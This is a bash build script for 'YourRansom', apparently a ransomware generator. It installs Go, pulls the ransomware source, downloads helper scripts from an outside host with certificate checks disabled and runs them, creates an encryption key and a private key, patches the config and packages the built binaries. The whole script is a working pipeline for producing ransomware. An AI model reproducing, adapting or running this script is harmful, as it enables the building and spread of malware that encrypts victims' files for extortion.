#!/usr/bin/env bash

TMP_DIR=~/.yr1k/
mkdir -p ${TMP_DIR}

msg() {
    echo -e "\033[32m $* \033[0m"
}


go &> /dev/null
if [[ $? -ne 2 ]]; then
    msg "Golang Environment not found, downloading"
    if [ "$(uname -s)" == "Darwin" ]; then
      os="darwin"
    else
      os="linux"
    fi
    case $(getconf LONG_BIT) in
        32)
        wget https://storage.googleapis.com/golang/go1.8.1.${os}-386.tar.gz -o/dev/null --no-check-certificate -O golang.tar.gz
        ;;
        64)
        wget https://storage.googleapis.com/golang/go1.8.1.${os}-amd64.tar.gz -o/dev/null --no-check-certificate -O golang.tar.gz
        ;;
    esac
    tar -C /usr/local -xzf golang.tar.gz
    echo "export PATH=$PATH:/usr/local/go/bin" >> ~/.bashrc
    echo "export GOPATH=$HOME/go-workspace" >> ~/.bashrc
    mkdir -p $HOME/go-workspace
    export PATH=$PATH:/usr/local/go/bin
    export GOPATH=$HOME/go-workspace
fi


msg "Getting source code of YourRansom"
go get "github.com/YourRansom/YourRansom"


msg "Generating config of YourRansom"
rand_str=$(date +%s%N | md5sum | head -c 8)
(
cd ${TMP_DIR}
wget https://sh.bobiji.com/yr1k/asker.py -o/dev/null --no-check-certificate
wget https://sh.bobiji.com/yr1k/main.go -o/dev/null --no-check-certificate

python3 asker.py 2>args
args=$(cat args)

go build -o config.o main.go
chmod a+x config.o
./config.o ${args} -desKey ${rand_str} > data.enc
)
cp ${TMP_DIR}/private.pem ./YourRansom.private
config=$(cat ${TMP_DIR}/data.enc)

YRPATH=${GOPATH}/src/github.com/YourRansom/YourRansom/
if [ ! -f "${YRPATH}/config.go.bak" ]; then
    cp -f ${YRPATH}/config.go ${YRPATH}/config.go.bak
else
    cp -f ${YRPATH}/config.go.bak ${YRPATH}/config.go
fi
sed -i "s|YOUR_CONFIG|${config}|" ${YRPATH}/config.go
sed -i "s|YOUR_PW|${rand_str}|" ${YRPATH}/config.go


msg "Building Your Ransom"
(cd ${YRPATH}; go get .;)
make -C ${YRPATH}

tar czf ./yr1k.tar.gz ${YRPATH}/dists/*
